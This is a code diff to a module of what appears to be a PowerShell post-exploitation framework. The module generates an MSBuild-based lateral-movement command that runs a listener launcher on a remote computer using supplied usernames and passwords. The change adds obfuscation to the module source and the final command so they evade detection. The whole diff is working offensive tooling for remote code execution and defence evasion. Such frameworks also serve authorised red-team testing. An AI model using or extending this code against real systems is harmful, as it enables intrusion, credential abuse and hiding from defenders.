@@ -118,7 +118,7 @@ class Module:
                     self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -126,6 +126,9 @@ class Module:
         proxyCreds = self.options['ProxyCreds']['Value']
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1"
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -136,7 +139,7 @@ class Module:
         f.close()
 
         script = moduleCode
-        script += "Invoke-ExecuteMSBuild"
+        scriptEnd = "Invoke-ExecuteMSBuild"
         credID = self.options["CredID"]['Value']
         if credID != "":
             
@@ -169,16 +172,19 @@ class Module:
                 script = script.replace('LAUNCHER',launcher)
 
         # add any arguments to the end execution of the script
-        script += " -ComputerName " + self.options['ComputerName']['Value']
+        scriptEnd += " -ComputerName " + self.options['ComputerName']['Value']
 
         if self.options['UserName']['Value'] != "":
-            script += " -UserName \"" + self.options['UserName']['Value'] + "\" -Password \"" + self.options['Password']['Value'] + "\""
+            scriptEnd += " -UserName \"" + self.options['UserName']['Value'] + "\" -Password \"" + self.options['Password']['Value'] + "\""
 
         if self.options['DriveLetter']['Value']:
-            script += " -DriveLetter \"" + self.options['DriveLetter']['Value'] + "\""
+            scriptEnd += " -DriveLetter \"" + self.options['DriveLetter']['Value'] + "\""
 
         if self.options['FilePath']['Value']:
-            script += " -FilePath \"" + self.options['FilePath']['Value'] + "\""
+            scriptEnd += " -FilePath \"" + self.options['FilePath']['Value'] + "\""
 
-        script += " | Out-String"
+        scriptEnd += " | Out-String"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
